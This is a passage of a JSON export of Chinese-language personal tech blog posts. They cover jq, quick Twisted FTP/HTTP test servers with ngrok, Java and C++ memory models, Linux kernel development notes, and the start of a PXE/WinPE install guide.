\u0026#34;Test Value 2\u0026#34;, \u0026#34;08/30/2017 16:07:38\u0026#34; ], [ \u0026#34;Test Value 2\u0026#34;, \u0026#34;08/30/2017 15:59:07\u0026#34; ] ] 變成\n[ [ \u0026#34;Test Value\u0026#34;, \u0026#34;08/30/2017 16:33:35\u0026#34; ], [ \u0026#34;Test Value\u0026#34;, \u0026#34;08/30/2017 16:22:38\u0026#34; ] [ \u0026#34;Test Value 2\u0026#34;, \u0026#34;08/30/2017 16:07:38\u0026#34; ], [ \u0026#34;Test Value 2\u0026#34;, \u0026#34;08/30/2017 15:59:07\u0026#34; ] ] 可以用faltten\nfaltten(1) 這樣就能攤平一層\nmap, reduce 就是map與reduce，不過要注意.代表什麼\nmap 括號中的點是array或obj被走到的value reduce 第一個點是整個input 第二個點是acc(累積的項目) 把[1,2,3]變成[11,12,13]\njq \u0026#39;map(.+10)\u0026#39; jq \u0026#39;reduce .[] as $i ([]; . += [($i+10)])\u0026#39; else jq還能\nregex if-else 可以判斷type，數字，字母，奇偶 while 自訂function與recurse operator math(像三角函數) 許多builtin function Ref jq get each value in array with parent jq Manual\n","permalink":"https://littlebees.github.io/2021/06/jq%E4%BD%BF%E7%94%A8%E7%AD%86%E8%A8%98/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e在bash想處理json的好工具\u003c/p\u003e","title":"jq使用筆記"},{"content":"動機 之前工作要架簡單的server去測，但裝一般的server還要設定有的沒的，所以用這個來偷吃步\ntwisted 一個方便寫network programming的framework\n會遇到的理由是之前想架ftp server測試用，但是arch linux的vsftpd架不起來(居然要systemd-homed!?) 所以找到他，下面是ftp server的範例\nfrom twisted.protocols.ftp import FTPFactory, FTPRealm from twisted.cred.portal import Portal from twisted.cred.checkers import AllowAnonymousAccess, FilePasswordDB from twisted.internet import reactor p = Portal(FTPRealm(\u0026#34;./\u0026#34;), [AllowAnonymousAccess(), FilePasswordDB(\u0026#34;pass.dat\u0026#34;)]) f = FTPFactory(p) reactor.listenTCP(21, f) reactor.run() code很短，也很好架，python+code就結束\nhttp server(from官網)\nfrom twisted.web import server, resource from twisted.internet import reactor, endpoints class Counter(resource.Resource): isLeaf = True numberRequests = 0 def render_GET(self, request): self.numberRequests += 1 request.setHeader(b\u0026#34;content-type\u0026#34;, b\u0026#34;text/plain\u0026#34;) content = u\u0026#34;I am request #{}\\n\u0026#34;.format(self.numberRequests) return content.encode(\u0026#34;ascii\u0026#34;) endpoints.serverFromString(reactor, \u0026#34;tcp:8080\u0026#34;).listen(server.Site(Counter())) reactor.run() 其他還有mail, ssh, reverse-proxy等等\n不過我看不懂要怎麼用，都是用範例去改 所以我都是需要什麼用twisted what-i-want去找\n範例在source code的docs各個項目中的example\n有教學，Twisted Introduction也有中文的\n怪怪的ftp 之前把ftp server用好後，無法重現ftp傳檔的bug，但是vsftpd可以，十分的詭異\nbug是連vpn用ftp經過router過一段時間就會停止傳輸最後timeout，但是用twisted的http server可以重現\nngrok 方便建https，不然要自己用public ip與reverse proxy與ssl證書(好麻煩)，ngrok只要三步就搞定了\n載ngrok的執行檔 辦帳號拿token ./ngrok authtoken your-token登入 ./ngrok proto port proto支援http, tls, tcp port就是server的port 之後terminal就會顯示網址，就可以連以及有https ","permalink":"https://littlebees.github.io/2021/06/%E7%94%A8twisted%E8%BF%85%E9%80%9F%E6%9E%B6%E7%B0%A1%E5%96%AE%E7%9A%84server/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e之前工作要架簡單的server去測，但裝一般的server還要設定有的沒的，所以用這個來偷吃步\u003c/p\u003e","title":"用twisted迅速架簡單的server"},{"content":"動機 之前看完linux kernel的同步方式，對同步有新的理解，可以重新面對這個話題了\n原子性、可見性 原子性: 全都完成，不然就是根本沒做 race condition primitive有可能不是atomic java的long與double就不是 大部分arch可以讓32bit的資料atomic 但long與double不是阿 就可能要分兩次，這樣就出事了 C++的atomic類別 C++支援struct，但是struct的大小不一定 如果有align那好說，但是如果沒有compiler就要自己動手腳(好麻煩) Word Tearing 更新相鄰的資料時，會影響到隔壁!? 像boolean在java是1byte! 這與arch能處理的最小單位有關，大部分arch是8bits 所以要更新就要一次跑1byte 可以同時跑2個thread做java的BitSet(可以想成byte[])set 可能只更新其中一位或是兩位都更新 因為是做bitwise，所以是一次更新1byte 可見性: 在後面的指令能看到前面的影響 reorder與亂序執行 不同arch的reorder規則 強(只准store-load): x86, sparc-tso 弱(LL,LS,SS,SL都可): powerpc, ia64, arm 資料相依 write-read, write-write, read-write 這在任何arch都不會被reorder，但僅限single thread的scope smp與multi-thread之間沒有 (所以需要後面的規則) cache 順序性: 前面跑完才能跑後面 reorder是會保證single thread中的code與reorder前跑出來的結果是一樣的 java memory model happen-before(hb) 在放在A指令之前的指令所做出的改變，A指令一定看的到\n同一個scope中具有順序性 在同一thread中，前一條指令對後一條指令是happen-before 前一個synchronized的解鎖，對後一個synchronized的加鎖是happen-before 先寫後讀 (先啟動後執行) 一個volatile的寫，對後續任何volatile的讀是happen-before thread的start，對該thread的所有指令是happen-before thread的interrupt，對所有檢查interrupt的指令是happen-before thread的join，對所有檢查thread存活的指令是happen-before obj初始化，對obj的finalize是happen-before A hb B，且B hb C，則A hb C causality (因果關係) 下面是無中生有(out-of-thin-air)的其中一種例子 foo被reorder成foo2，就happen-before而言，這沒錯，但執行下去就出事\n// x == y == 0 void foo(){ r1=x; if(r1 != 0) y=42; } /* void foo2(){ y=42; r1=x; if(r1 != 0) y=0; } */ ​ void bar(){ r2 = y; if(r2 != 0) x=42; } // r1==r2==42? 為了防止這種事發生，才有causality檢查\n根據\n控制流 資料相依 去看執行結果會不會有奇怪的東西\n關於如何檢查，我看了好久還是不太懂，在ref有範例，等PLT的功力回來再說吧\n實際上的做法是 保持原子性 volatile (++是複合動作，要注意) 原本volatile只是確保取值都從mem拿，確保可見性 但java memory model保證volatile讀寫比較不會被reorder，進而保證了原子性(只有一寫對一個以上的讀才有!!) 但沒有mutual exclusion，所以如果很多thread一起攻擊的話就會出事，可以看下面的code synchronized 上barrier與禁止reorder，保持可見性與順序性 java的volatile 一個加一個減，照理來說要是0\npublic class Main { public static volatile int race = 0; private static final int INCREASE_COUNT = 10000; public static void main (String[] args) { Thread[] threads = new Thread[2]; System.out.println(System.currentTimeMillis()); threads[0] = new Thread(new Runnable() { @Override public void run () { for (int i = 0; i \u0026lt; INCREASE_COUNT; i++) { race++; } } }); threads[1] = new Thread(new Runnable() { @Override public void run () { for (int i = 0; i \u0026lt; INCREASE_COUNT; i++) { race--; } } }); threads[0].start(); threads[1].start(); while (Thread.activeCount() \u0026gt; 1) { Thread.yield(); } System.out.println(System.currentTimeMillis()); System.out.println(race); } } volatile的happen-before是寫之後可以被所有讀看到，但是剛剛是一個讀前面有一堆寫 要處理這件事就是加個條件，在不符合條件時就不做事，確保只有一個寫\npublic class Main { public static volatile int race = 0; private static final int INCREASE_COUNT = 10000000; public static void main (String[] args) { Thread[] threads = new Thread[2]; System.out.println(System.currentTimeMillis()); threads[0] = new Thread(new Runnable() { @Override public void run () { for (int i = 0; i \u0026lt; INCREASE_COUNT; i++) { if (race \u0026lt;= 0) { race++; } else { i--; } } } }); threads[1] = new Thread(new Runnable() { @Override public void run () { for (int i = 0; i \u0026lt; INCREASE_COUNT; i++) { if (race \u0026gt; 0) { race--; } else { i--; } } } }); threads[0].start(); threads[1].start(); while (Thread.activeCount() \u0026gt; 1) { Thread.yield(); } System.out.println(System.currentTimeMillis()); System.out.println(race); } } 所以如果真的需要就是用AtomicInteger，同時我用jdoodle去跑明顯這個比較快 因為不是每次的loop都會做事，可能有不做事的時候，導致時間的浪費\nimport java.util.concurrent.atomic.AtomicInteger; public class Main { public static AtomicInteger race = new AtomicInteger(); private static final int INCREASE_COUNT = 10000000; public static void main (String[] args) { Thread[] threads = new Thread[2]; System.out.println(System.currentTimeMillis()); threads[0] = new Thread(new Runnable() { @Override public void run () { for (int i = 0; i \u0026lt; INCREASE_COUNT; i++) { race.incrementAndGet(); } } }); threads[1] = new Thread(new Runnable() { @Override public void run () { for (int i = 0; i \u0026lt; INCREASE_COUNT; i++) { race.decrementAndGet(); } } }); threads[0].start(); threads[1].start(); while (Thread.activeCount() \u0026gt; 1) { Thread.yield(); } System.out.println(System.currentTimeMillis()); System.out.println(race); } } 建到一半的物件 Double-Checked Locking 用在multi-thread生singlton，但是會出事\nclass Foo { private Helper helper = null; public Helper getHelper() { if (helper == null) { synchronized(this) { if (helper == null) helper = new Helper(); } } return helper; } } 在設定helper的值時，可以reorder成\n先給ref 之後init物件 但拿到ref就會讓if過，最後有人會拿到建到一半的物件\n其中一個解法是volatile，因為不會reorder\nclass Foo { private volatile Helper helper = null; public Helper getHelper() { if (helper == null) { synchronized(this) { if (helper == null) helper = new Helper(); } } return helper; } } 另一個解法是static的field，class初始化完static要存在可以利用這個特點\nprivate static class LazyFooHolder { public static Foo foo = new Foo(); } public static Foo getInstance() { return LazyFooHolder.foo; } final field java memory model保證任何access final的thread會看到freeze後的資料\n中間是藉由禁reorder(freeze不能在設值前發生，access不能再freeze前發生)\n但有趣的是，如果把this傳出去就不一定了\nObj1 obj = new Obj1(); final_field = 42; ptr1 = this; //freeze final_field ptr2 = this; 如果有thread看到ptr1，就直接去用，這樣就無法保證一定看的到final_field，因為設定ptr的指令可能被reorder，最後ptr1拿到的就是建到一半的物件(連final都還沒跑完)\ncpp memory model 基本就是基於java memory model，但多了可以控制atomic的memory barrier可以寬到哪邊去\n介紹memory barrier 就是控制reorder不要讓指令跑過barrier\n而指令可以分成Load或Store，所以有四種case\nLoadStore LoadLoad LoadLoad + LoadStore組成Acquire semantics java的volatile的寫與cpp的memory_order_acquire StoreStore StoreStore + LoadStore組成Release semantics java的volatile的讀與cpp的memory_order_release StoreLoad 只有這個是強與弱memory model都可以reorder的，所以call這個一定會有事發生 barrier有cpu版與compiler版，效力自然是cpu比較大\nmemory_order memory_order_relaxed 就是沒有barrier，只剩下原子性 memory_order_acquire 在這點之後的所有write與自己的read不會超過這裡 可以想成是第一個write，然後後面有很多其他write與自己的read 更形象一點可以想成上蓋 對應到java的volatile寫 memory_order_consume 與memory_order_acquire很像 但是只限制與目前變數有關的write不超過這邊 memory_order_release 在這點之後的所有write與自己的read不會超過這裡 可以想成是最後一個read，然後前面有很多其他write與自己的read 更形象一點可以想成下底 對應到java的volatile讀 memory_order_acq_rel acquire + release 這感覺就很像楚河漢界，上半部與下半部不會混在一起 memory_order_seq_cst 就是java的volatile，照順序來 臨時追加: ABA問題 主要是在lock-free才會提到，因為會看修改前與修改後沒有內容是不是沒被動過，但是如果只是看起來沒被動過?\nABA問題有三個條件\n重複讀某變數，同時只用此變數做condtion 每次讀與寫都沒有同步 被多個thread修改，值有可能變回去以前的某一個值 如何處理 加入一個變數，只能單調遞增 在做cond時除了看原本的變數，這個單調遞增的變數也要看\n轉帳問題 1. 小琳在 ATM 1 转账 100 块钱给小李； 2. 由于ATM 1 出现了网络拥塞的原因卡住了，这时候小琳跑到旁边的 ATM 2 再次操作转账；(有兩次轉帳) 3. ATM 2 没让小琳失望，执行了 CAS(100,0)，很痛快地完成了转账，此时小琳的账户余额为 0；(第一次轉帳) 4. 小王这时候又给小琳账上转了 100，此时小琳账上余额为 100； 5. 这时候 ATM 1 网络恢复，继续执行 CAS(100,0)，居然执行成功了，小琳账户上余额又变为了 0；(第二次轉帳) 6. 这时候小王微信跟小琳说转了 100 过去，是否收到呢？小琳去查了下账，摇了摇头，那么问题来了，钱去了哪呢？ Ref The Java Memory Model(這個有因果關係檢查的範例) Java Memory Model Pragmatics(人性化很多，適合第一次看) JSR-133 Review(中文的，解釋得很好) 对优化说不 - Linux中的Barrier ABA problem\n","permalink":"https://littlebees.github.io/2021/06/%E8%A8%98%E6%86%B6%E9%AB%94%E6%A8%A1%E5%9E%8B%E7%AD%86%E8%A8%98/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e之前看完linux kernel的同步方式，對同步有新的理解，可以重新面對這個話題了\u003c/p\u003e","title":"記憶體模型筆記"},{"content":"動機 不記實際上怎麼跑與跑了什麼，只記設計與方便未來查詢的部分 畢竟這是基於linux2.6的\n整體心得 讀完上一本工作原理來讀這本剛好，可以互補\n推薦讀 中斷: ch7~10 mem: ch12\u0026amp;ch15\n省略掉 ch1, 14, 20\n簡體版的翻譯錯誤有點多要小心，覺得怪就去看原文\nch1 skip\nch2 folder folder descrition arch x86, amd64之類的 block block device 的 IO層 crypto 加密API Documentation 文件 drivers device driver firmware driver需要的fw fs file system include kernel的header file init kernel引導與初始化 ipc 跨proc溝通 kernel 核心的kernel code(sched之類的) lib 通用kernel function mm 記憶體管理與virtual memory net 網路 samples 範例 scripts compile kernel用的腳本 security 安全模組 sound 聲音 usr userspace的code tools linux的開發工具 virt 虛擬化 make make menuconfig 調linux的設定 make defconfig 把menuconfig的設定設成預設 make oldconfig load從其他地方來的.config make compile 在kernel code的根目錄會產生System.map，裡面有symbol，需要可以看 kernel dev的特點 沒有libc與stdlib linux有自己的工具，可以看include裡面的header，像/inlucde/linux就是linux kernel的函數 用gnu c inline asmembly 內嵌 likely, unlikely之類的if優化 沒有mem保護 沒有seg fault，只剩panic 幾乎不能用floating point kernel stack十分小，並隨arch不同而有改變 同步很重要 preempt smp(多對稱處理器，多cpu) ch3 proc\n相關struct struct task_struct 在\u0026lt;linux/sched.h\u0026gt; proc的DS，有 pid addr space 打開的文件 等\u0026hellip; struct thraed_info 在\u0026lt;asm/thraed_info.h\u0026gt; 放在kernel stack上，用以找到task_struct 為什麼不直接放task_struct 放proc中與arch有關的訊息 可以想成goroutines的struct P proc state 正在跑、可以跑 TASK_RUNNING 睡 TASK_INTERRUPTABLE 等interrupt或其他或signal TASK_UNINTERRUPTABLE 不管signal，其他與TASK_INTERRUPTABLE一樣 clone syscall fork clone(SIGCHID, 0) kthread clone(CLONE_VM | CLONE_FS | CLONE_FILES | CLONE_SIGHAND, 0) VM: virtual mem FS: file system FILES: opend files SIGHAND: signal handler vfork (會sync執行的fork) clone(CLONE_VFORK | CLONE_VM | SIGCHID, 0) ch4 proc scheduler\nproc吃? IO scheduler應該要多拉吃IO的proc 不然response time會變慢 但throughput會低 cpu scheduler應該多拉吃cpu的proc 不然throughput會變慢 但response time會變慢 time slice 一個proc能佔cpu多少時間 太長 對吃cpu有利 對吃IO不利 高throughput 差response time cxt switch的總計花費時間小 太短 對吃cpu不利 對吃IO有利 低throughput 好response time cxt switch的總計花費時間多 proc優先級 nice -20~19 越小越優先 real-time priority 0~99 越大越優先 RT proc永遠優先於普通proc 兩個是各自獨立的系統 公平調度(CFS) 概念 依據cpu的使用比例分配 分配到的時間與系統負載密切相關 搶的時機是如果有proc花的使用比比當前proc少，就換上去 每個proc預設拿到1/n個cpu時間 n是proc個數 就是想像一共有proc個數 個cpu cpu時間在書中叫目標延遲 nice就是原本的1/n再乘上nice換出來的比值 實作 計時 在\u0026lt;linux/sched.h\u0026gt; struct_sched_entity vruntime 會記錄運行時間 以及以proc總數做標準化 choose proc 挑vruntime最小的 sched的interface schedule() 如果要睡覺 就是設定proc state再call這個 假喚醒 如果state是TASK_INTERRUPTABLE就會被signal叫醒 所以要檢查喚醒後發生什麼事 cxt switch 在\u0026lt;asm/mmu_context.h\u0026gt; switch_mm換virtual mem 在\u0026lt;asm/system.h\u0026gt; switch_to換cpu state preempt 用一個flag，need_resched去看該不該被搶 誰可以設? scheduler proc自己 preempt發生時機 user preempt 從syscall回到userspace 從中斷處理程序回到userspace kernel preempt 中斷處理程序結束，且回到kernel space之前 kernel的code再一次可以被搶的時候 need_resched被設 preempt_count是0 (在thread_info) kernel的code被block時 kernel的code調用schedule() RT schedule SCHED_FIFO proc一直跑，除非 block 自己想換 SCHED_RR 有time slice的SCHED_FIFO 低優先無法搶高優先即使對方的time slice花完了 都是soft rt ch5 syscall在上一篇筆記就說了，所以這裡focus在一些之前沒提到的東西\nasmlinkage 叫compiler只能從stack拿參數 參數驗證 ptr的addr是userspace的addr ptr的addr在proc的addr space中 讀寫要符合原本的讀寫限制 參數有效 pid有效 檔案有效 process context syscall是在process cxt 會睡覺 會被搶 在你想多加一個syscall(衝動)之前，可以 用dev file實現read, write，配合ioctl 創其他操作介面，像semaphore可以像file一樣操作 sysfs ch6 list_elment 在\u0026lt;linux/list.h\u0026gt; Linked List (bidiretion) 用法是在自己的struct中放一個list_elment 因為c沒泛型!! c應該叫mem描述語言才對 沒有特別需求時優先用list kfifo 在\u0026lt;linux/kfifo.h\u0026gt; Queue 遇到 consumer/producer時用 idr 在\u0026lt;linux/idr.h\u0026gt; Hash table uid(int) -\u0026gt; void * 要mapping時就用 rbtree 在\u0026lt;linux/rbtree.h\u0026gt; 紅黑樹 沒有find與insert，要自己寫 因為c沒泛型!! 大量data與反覆search就用 ch7 中斷(IRQ) 就是一個數字 異常與中斷很像 但異常要與cpu時鐘同步 中斷上下文 不會block(睡覺) 當他出現時，一定是 打斷了某個proc 甚至是，不同irq stack的irq 上半段 與 下半段 上半段: 馬上處理 下半段: 原本中斷中可以之後再處理的 request_irq 註冊irq 會sleep reenter? irq被call時，該irq會被mask起來，其他cpu看不到 IRQF_SHARED 多個dev用同一個irq 所以 dev的addr唯一，也就是可以區分不同device code有辦法對應不同device /procs/interrupts PC上所有irq的資訊 中斷控制器 停用 cpu上的整個中斷 這樣這個cpu上就不會被preempt 但其他cpu還是可以中斷!! 所有cpu的某個中斷 看\u0026lt;asm/system.h\u0026gt;與\u0026lt;asm/irq.h\u0026gt; ch8 中斷，下半段\nsoftirq 同一個softirq可以同時跑在其他cpu上 靜態註冊 (compile-time) 在\u0026lt;linux/interrupt.h\u0026gt; struct softirq_action softirq放在array中(32個) 中斷上下文 softirq沒辦法搶其他的softirq softirq只會被irq搶!! 跑什麼softirq irq handler在return前會標 什麼時候跑softirq? irq handler在return時 在softirqd中 有人去看還有哪些softirq還沒跑與直接執行softirq的時候 tasklet 同一個tasklet不可以同時跑在其他cpu上 動態註冊 在\u0026lt;linux/interrupt.h\u0026gt; struct tasklet_struct 有執行狀態 所以其他cpu不會跑正在跑的tasklet tasklet放在cpu上的linked list tasklet_vec tasklet_hi_vec (hi是high) 所以可以動態加 中斷上下文 tasklet就是掛在兩個softirq上 把task往裡面放，需要時就跑 ksoftirqd 每個cpu上會有一個 處理大量softirq 在最低nice的kthread中去調用還沒跑的softirq work queue proc上下文 可以allocate大mem semaphore 用block IO 每個cpu一個queue與kthread，跑task 我們需要一個可以看到所有cpu的struct 在\u0026lt;linux/workqueue.h\u0026gt; struct workqueue_struct 放workqueue訊息 proc叫event/n 在\u0026lt;kernel/workqueue.c\u0026gt; struct cpu_workqueue_struct 就是queue 在\u0026lt;linux/workqueue.h\u0026gt; struct work_struct 就是task 每個cpu上會有一個 n是cpu編號 how to lock proc cxt與bottom half分享data 鎖bottom half 拿鎖 irq cxt與bottom half分享data 鎖irq 拿鎖 irq -\u0026gt; softirq/tasklet -\u0026gt; proc 如果要和上一層share data 鎖上一層!! 防smp與preempt 拿鎖 可以看Unreliable Guide To Locking有詳細的解釋 ch9\u0026amp;10 怎麼等鎖 busy waiting 都能用 sleep only in proc ctx 要同步的原因是 in userspace preempt re schedule in kernel space irq softirq/tasklet preempt sleep \u0026amp; sync with userspace smp struct什麼時候加鎖 kernel struct大部分都要 有其他proc可以access 任何人都看的到的 原子性與順序性 原子性 執行期間不打斷，只有兩個case 沒有跑 跑完了 順序性 ABC分散在不同中，也要ABC去跑 用lock只能保證，ABC一起跑，一起不跑 用semaphore可以幹出來 主要用barrier 讀寫鎖(RW) 只能有下面的其中一種case 1寫 多讀 有利於讀 只要一堆讀，寫就只要等就飽了 工具 atomic_t spinlock busy waiting 使用時不能sleep 不然就是增加整體的response time 如果lock時間小於2次ctx switch才有利 no recur 不能鎖了又鎖 在irq中用的話 先關irq 不然被中斷，另一irq又拿同一個鎖的話\u0026hellip; 有RW版 禁止preempt 持有spinlock就是禁止preempt semaphore sleep only in proc ctx 任何持有人都可以上鎖或解鎖!! 可以超過一個人到critical zone 有RW版 mutex sleep only in proc ctx 上鎖的人才能解鎖 只有一個人能到critical zone 可以recur 可以處理priority inversion complete variable cond var seq lock 實作 有一個acc 當write拿鎖時，會acc++ read時就是確認開始與結束的acc值是不是一樣 確認中間沒有write 也可以透過acc是不是偶數看寫結束語否 有利於寫 mem barrier barrier前面的code跑完前，絕對不會跑後面去 起因於 指令重排，所以有些指令會跑到後面去 前半部的code不會到reorder到後面去 priority inversion 一般來說是在RT才會提，但想到就記一下 情境 pri最小(A)拿到lock中被中斷 pri高的(C)想拿lock，但拿不到!! 像spinlock會busy waiting pri高的跑不動，time slice吃完 有下一個pri比較低的(B)，來了，也做完了!? 但pri高的還沒做完阿!! 起因 lock的效果會影響優先權，但是沒有納入原有優先權的系統中 像只要有人拿了spiclock，那他在這一塊就是最優先的 不管其他優先權怎麼設，bust waiting就是wait，沒有轉圜的機會 同時也無法打斷，不然就不是crtical zone了 解法 大方向: crtical zone要先跑!! 要改crtical zone的優先權 改到與現在最高的一樣高 改到沒有人比crtical zone高 Priority inheritance 在crtical zone時，遇到更高的proc同時要進來 把crtical zone的優先權拉到與那個proc一樣高 跑完crtical zone就降回去 Priority ceiling protocol 在crtical zone時拉到最高 跑完crtical zone就降回去 ch11 怎麼算1秒 系統計時器會依一定頻率(tick rate)打中斷 這樣kernel知道兩次中斷之間的間隔時間(tick) HZ就是1sec打幾次 HZ可以改!! HZ越高 時間精準度越高 連帶與時間有關的都會變準 poll, select preempt system load上升 這是kernel用的 userspace的叫USER_HZ 1sec = tick * HZ 開機多久了 jiffies 紀錄系統計時器中斷打了幾次 jiffies/HZ =\u0026gt; 開機多久 硬體 RTC bios上存時間(幾點幾分之類的)的 就算電腦關機，還是藉由CMOS繼續跑 開機時初始化xtime變數 系統計時器 由kernel設定tick rate 關於proc的計時 每一次中斷時就把當前proc狀態(idle, run\u0026hellip;)的變數遞增一次 如果在這中斷之間多次換狀態? 不管，現在他在這個狀態，這一段時間都是這個狀態的 如何delay delay執行，不應該在有lock時或是關閉中斷後發生\nbusy wait base on jiffies short delay 如果要的delay比tick小 用udelay(),ndelay(),mdelay() 裡面其實也是loop，但是kernel知道他會跑多久且不用jiffies schedule_timeout() 讓task睡，在超過指定時間後跑 沒辦法說很精確在時間到就馬上跑 soft rt ch12 kernel space的mem\n整體 phy mem byte word cpu page kernel struct zone 在\u0026lt;linux/mmzone.h\u0026gt; struct page 在\u0026lt;linux/mm_types.h\u0026gt; 對應到實體的page 再從page換成addr alloc_pages -\u0026gt; page_address kmalloc 不能要求ZONE_HIGHEM 因為可能還沒分配邏輯addr 用alloc_pages 上面都是 連續的page 可以sleep時用GFP_KERNEL 不可以sleep時用GFP_ATOMIC vmalloc 可能不連續的page 不同page在不同位置，所以有不同區 4種 ZONE_DMA ZONE_DMA32 only for 32bits device ZONE_NORMAL ZONE_HIGHEM high mem用，不能用永久map到kernel addr空間 想想kernel都是用低的mem，所以高的其實算是userspace的 如果要用就要map 永久: kmap (low與high都能用，會睡覺) 臨時: kmap_atomic (不會睡，但是會被下一個) slab 在快取記憶體上(kmem_cache)開一個list當成object pool 之後重複利用裡面已經存在的obj slab就是list上的node，node裡面放obj struct slab 在\u0026lt;mm/slab.c\u0026gt; 額外 stack 每個proc有 kernel stack 1~2 page (根據arch) 原本中斷也是用被中斷的proc的stack kernel stack本來就很小，還是別吧 最後有了interrupt stack user stack 就一般的stack kernel stack是為了與user stack分開 想想兩個混在一起會發生什麼事 每個cpu有 interrupt stack percpu 每個cpu自己的data 因為是cpu自己的，所以 cache失效降低 不用擔心smp preempt還是要怕 ch15 user space的mem\n整體 proc的userspace的mem空間 struct mm_struct 在\u0026lt;linux/sched.h\u0026gt; 可以到/proc/\u0026lt;pid\u0026gt;/maps看proc現在有什麼 主要兩個 struct vm_area_struct 在\u0026lt;linux/mm_types.h\u0026gt; 就是這裡的page，加上權限與狀態之類的 在mm_struct有兩個obj放vm_area_struct list: 方便iterate rbtree: 方便找定點 pgd_t phy的page表 三層 (pgd -\u0026gt; pmd -\u0026gt; pte) 用這個換出實際addr 額外 kthread的mm kthread天生沒有mm (不然怎麼有k) 當需要的時候會從proc的ptr拿到 當schedule會存前一個proc的mm (active_mm) 當kthread需要(像page table)，就直接用active_mm看 mmap 把file放到proc的userspace的mem空間 生一個addr出來 ch13 virtual file system的流程 userspace virtual file system 真的file system phy VFS的attribute superblock 真的file system (ext4, brtfs\u0026hellip;) struct file_system_type 在\u0026lt;linux/fs.h\u0026gt; 放fs的訊息(kernel關心的) struct vfsmount 在\u0026lt;linux/mount.h\u0026gt; fs的統計數據與安裝訊息(root, dev等等)與安裝點 可以當成實際fs的入口 放fs的訊息(VFS關心的) struct super_block 在\u0026lt;linux/fs.h\u0026gt; inode file or folder 放file/folder的訊息 struct inode 在\u0026lt;linux/fs.h\u0026gt; dentry path的一部份 /usr/bin/vi的 /, usr, bin, vi 其實可以當成inode，但是為了查找path，所以獨立出來 struct dentry 在\u0026lt;linux/dcache.h\u0026gt; state 被用 有對應的file 也正在被ref 還沒被用 有對應的file 沒被ref 不在 根本沒這個file 總不能每次要等整個找完才丟沒有指定的檔案吧 同時，因為有這個與slab，在之後真的有檔案也可以直接快取 file opend file struct file 在\u0026lt;linux/fs.h\u0026gt; 看看proc 每個proc都有 struct files_struct 在\u0026lt;linux/fdtable.h\u0026gt; 紀錄 開過的檔案 struct fs_struct 在\u0026lt;linux/fs_struct.h\u0026gt; 紀錄 pwd, 現在跑的檔案 每個namespace都有 struct mmt_namespace 在\u0026lt;linux/mmt_namespace.h\u0026gt; 放vfsmount，讓同一namespace的去找 ch14 skip\nch16 快取策略 nowrite 不管cache，直接寫到mem cache直接失效 write-through 同時更新cache與mem write back 先更cache 再找時間更mem 快取無效策略 LRU 從list中拿掉最少用到的 LRU/2 兩條list 熱的 不熱的 變成熱的方式 在不熱的中 有被用到 如何調整兩條list 熱的比不熱的長 把一些去掉 怎麼去掉 fifo (不是最少用到) 熱的list就是原本LRU中記錄頻率的腳色 只要在熱的list就是有用過 page快取(上一篇心得的file快取) struct address_space 在\u0026lt;linux/fs.h\u0026gt; 應該叫page_cache_entity 這是write back 什麼時候寫回去 cache要沒了 cache放太久了 有人callsync(),fsync() 誰去寫 靠flusher的多thread去寫 (原本是單thread) 但還是會被底下的IO給bound ch17 編module makefile obj-m += foo.o # obj-m += foo.o 加在sourcetree中的makefile中 foo-objs := foo-main.o foo-utils.o 編 make -C /kernel/path SUBDIRS=$PWD modules 安裝 make modules_install 生相依訊息 depmod depmod -A only for new added modules 加編譯選項 改Kconfig export what? 參數 static int a = 1; module_param_named(exported_name, a, int, 0644); symbol table EXPORT_SYMBOL(your_func); EXPORT_SYMBOL_GPL(your_func); device model \u0026amp; sysfs device model struct kobject\n在\u0026lt;linux/kobject.h\u0026gt; 就是obj 與list一樣要嵌到其他struct上才有用 在sysfs中會變成folder 他的參數會變成file struct attribute 在\u0026lt;linux/sysfs.h\u0026gt; 會有值，可讀寫 struct sysfs_ops 在\u0026lt;linux/sysfs.h\u0026gt; 有read/write可以實作 struct ktype\n在\u0026lt;linux/kobject.h\u0026gt; 就是放methods struct kset\n在\u0026lt;linux/kobject.h\u0026gt; 就是class(obj的base，js的prototype) sysfs block 列出註冊的block dev bus 列出系統的bus class 列出依func排列的dev net, block, ppp, rtc等等 dev 列出註冊的dev block, char devices 列出dev的topo platform, system, virtual等等 firmware 與系統有關的low-level子系統 ACPI, EDD, EFI fs 列出filesystem kernel 列出kernel狀態與option modules 列出載入的module power 列出電源管理的資料 ch18\u0026amp;19 開發tips 保留一個能動的，一個用新版，其他用舊版 用uid(user)去切 加個condition 加統計量 限制output的頻率 每個幾秒印一次 只印幾次 輸出自己的錯誤訊息 我自己會在一定看的到的地方(像家目錄)，放log align 由大到小去排\n// total: 12 struct A { char a; // 1+3 unsigned long b; // 4+0 unsigned short c; // 2+1+1 char d; }; // total: 8 struct B { unsigned long b; // 4+0 unsigned short c; // 2+1+1 char a; char d; }; big/little endian 變成binary: 會變成abcd 最左是最高有效位 big-endian: 最高有效位放arr第一個 little-endian: 最低有效位放arr第一個 最高有效位與最低有效位的技法: 下坡(反斜線)，所以最高在左邊\n一些數字 不要假設HZ、page的長度 沒有寫明長度的type的長度都是不確定的 除了 char是1byte (ansi c) int通常是32位 ch20 skip\n","permalink":"https://littlebees.github.io/2021/06/linux-kernel-development-3rd%E7%AD%86%E8%A8%98/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e不記實際上怎麼跑與跑了什麼，只記設計與方便未來查詢的部分\n畢竟這是基於linux2.6的\u003c/p\u003e","title":"Linux Kernel Development 3rd筆記"},{"content":"動機 我找不到我的隨身碟，剩下的sd卡也掉到某個床縫中，暫時拿不到 只好來研究怎麼用網路來裝OS了\n原本用serva，好不容易用完，開機之後發現帳密不管怎麼打都不對，就只好自立自強了\nPXE需要? DHCP server 發IP 教PXE cilent要載什麼檔案 TFTP server embed中常用的file transfer protocol 這裡是用TFTPD64\n網路topo PXE server \u0026lt;=\u0026gt; L2 switch \u0026lt;=\u0026gt; 要被裝的電腦 怎麼搞PXE 取得WinPE 下載Windows ADK 下載適用於 Windows 10 版本 2004 的 Windows ADK 選部署工具就可以了 下載適用於 ADK 版本 2004 的 Windows PE 附加元件 把winpe抽出來，這裡拉amd64 copype.cmd amd64 C:\\winpe_amd64 做pxe需要的資料夾，這裡需要 winpe的PXE 開機檔案 把winpe掛載上去， Dism /mount-image /imagefile:c:\\winpe_amd64\\media\\sources\\boot.wim 